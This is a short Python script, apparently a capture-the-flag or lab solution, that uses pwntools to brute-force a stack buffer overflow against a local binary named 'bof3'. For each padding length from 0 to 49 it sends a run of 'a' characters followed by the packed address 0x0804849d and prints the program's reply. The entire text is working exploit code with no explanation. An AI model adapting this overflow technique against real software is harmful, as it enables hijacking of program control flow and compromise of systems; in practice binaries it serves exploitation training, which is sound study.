
from pwn import *
key = p32(0x0804849d)


for i in range(0,50):

	p = process('./bof3')
	payload = "a"*i + key
	payload += '\x0a'

	p.sendline(payload)

	recv = p.recv(2096)

	print(recv)